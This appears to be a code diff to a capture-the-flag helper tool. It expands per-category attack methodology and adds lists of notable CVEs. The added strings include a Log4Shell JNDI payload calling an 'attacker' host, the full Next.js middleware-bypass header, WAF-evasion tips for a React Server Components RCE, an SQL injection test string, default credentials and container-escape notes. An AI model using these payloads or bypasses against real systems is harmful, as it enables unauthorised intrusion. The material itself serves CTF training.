@@ -40,7 +40,7 @@ TOOL_ALIASES: dict[str, str] = {
 # Maps challenge type → description, relevant modules, and top tools with descriptions.
 CTF_CATEGORY_MAP: dict[str, dict] = {
     "web": {
-        "description": "Web application exploitation — SQL injection, XSS, SSRF, auth bypass, deserialization",
+        "description": "Web exploitation — SQLi, XSS, SSRF, auth bypass, deserialization, prototype pollution",
         "modules": ["web", "recon", "networking"],
         "tools": [
             ("mitmproxy", "Intercepting HTTP/HTTPS proxy"),
@@ -57,17 +57,39 @@ CTF_CATEGORY_MAP: dict[str, dict] = {
             ("dalfox", "XSS parameter analysis and scanning"),
         ],
         "methodology": [
-            "1. RECON: Run whatweb/httpx for tech stack, ffuf/gobuster for hidden paths",
-            "2. ENUMERATE: Check robots.txt, .git, backup files, API endpoints",
-            "3. ANALYZE: Inspect cookies, headers, JS source code, parameters",
-            "4. EXPLOIT: Test SQLi (sqlmap), XSS (dalfox), SSRF, auth bypass",
-            "5. ESCALATE: Pivot via discovered access, try deserialization, SSTI, file upload",
+            "1. RECON: whatweb/httpx for tech stack + headers, ffuf/gobuster for hidden paths",
+            "2. ENUMERATE: robots.txt, .git/HEAD, .env, backup files, API endpoints, JS bundles",
+            "3. ANALYZE: Read JS source — grep for server action IDs, API keys, internal hostnames, "
+            "hidden routes. Check /_next/static/<buildId>/_buildManifest.js for route map. "
+            "Look for .hint files, env vars leaking internal service names",
+            "4. EXPLOIT: SQLi (sqlmap), XSS (dalfox), SSRF, SSTI, deserialization, "
+            "prototype pollution. If WAF blocks payloads: try string concat, alternate functions, "
+            "encoding tricks",
+            "5. ESCALATE: After initial access, check env vars and filesystem for internal "
+            "service hostnames/ports, then pivot via SSRF or RCE to reach them",
         ],
         "quick_wins": [
             "Check robots.txt and /.git/HEAD",
             "Test ' OR 1=1-- in all input fields",
             "Try admin:admin, admin:password",
-            "Inspect HTML comments and JS source code",
+            "Read all JS bundles — search for hardcoded secrets, action IDs, internal URLs",
+            "If Docker: check /.dockerenv, env vars, /etc/hosts for internal services",
+        ],
+        "notable_cves": [
+            "CVE-2025-55182 — React2Shell: RCE via React Server Components Flight protocol. "
+            "Craft multipart POST with prototype pollution payload (__proto__/constructor chain) "
+            "to reach Function constructor. Hits any Next.js/React RSC endpoint with server actions. "
+            "WAF bypass: split 'child_process' via string concat, use spawnSync instead of execSync",
+            "CVE-2025-29927 — Next.js middleware bypass: header 'x-middleware-subrequest: "
+            "middleware:middleware:middleware:middleware:middleware' skips all middleware checks. "
+            "Exposes auth-protected routes. Affects Next.js <15.2.3, <14.2.25",
+            "CVE-2021-44228 — Log4Shell: Java RCE via JNDI injection in log messages. "
+            "Payload: ${jndi:ldap://attacker/a}. Test in User-Agent, headers, form fields",
+            "CVE-2021-22204 — Exiftool RCE via DjVu metadata. Upload crafted image, "
+            "triggers code execution when server runs exiftool on it",
+            "CVE-2023-46747 — F5 BIG-IP auth bypass: unauthenticated RCE via /mgmt/tm/util/bash",
+            "CVE-2019-11043 — PHP-FPM RCE via path_info: send \\n in URL to corrupt FPM buffer. "
+            "Targets nginx + php-fpm with specific try_files/fastcgi_split_path_info config",
         ],
     },
     "crypto": {
@@ -181,6 +203,13 @@ CTF_CATEGORY_MAP: dict[str, dict] = {
             "Check exiftool for hidden metadata and comments",
             "Use strings | grep -i flag on the entire file",
             "Try foremost for file carving from disk/memory dumps",
+        ],
+        "notable_cves": [
+            "CVE-2021-22204 — Exiftool RCE via DjVu metadata: upload a crafted .djvu/.jpg "
+            "that triggers command execution when the server parses metadata with exiftool. "
+            "Common in file upload challenges where the server processes metadata",
+            "CVE-2022-4510 — Binwalk path traversal RCE: crafted PFS filesystem in firmware "
+            "image can write arbitrary files during extraction (binwalk <2.3.4)",
         ],
     },
     "stego": {
@@ -349,6 +378,12 @@ CTF_CATEGORY_MAP: dict[str, dict] = {
             "Try public S3 bucket enumeration",
             "Check IAM policies for overprivileged roles",
         ],
+        "notable_cves": [
+            "CVE-2024-21626 — Leaky Vessels: container escape via /proc/self/fd race in runc. "
+            "Attacker in container can overwrite host binaries",
+            "CVE-2020-15257 — containerd host network namespace: containers with host network "
+            "can access containerd shim API and escape to host",
+        ],
     },
     "mobile": {
         "description": "Mobile security — Android/iOS app analysis, APK reversing, dynamic testing",
@@ -490,7 +525,7 @@ def suggest_for_ctf(challenge_type: str, tools_db: ToolsDatabase) -> dict:
 
     installed_count = sum(1 for t in tools_with_status if t["installed"])
 
-    return {
+    result = {
         "category": category,
         "description": cat_info["description"],
         "modules": cat_info["modules"],
@@ -499,3 +534,6 @@ def suggest_for_ctf(challenge_type: str, tools_db: ToolsDatabase) -> dict:
         "quick_wins": cat_info.get("quick_wins", []),
         "summary": f"{installed_count}/{len(tools_with_status)} tools installed",
     }
+    if "notable_cves" in cat_info:
+        result["notable_cves"] = cat_info["notable_cves"]
+    return result
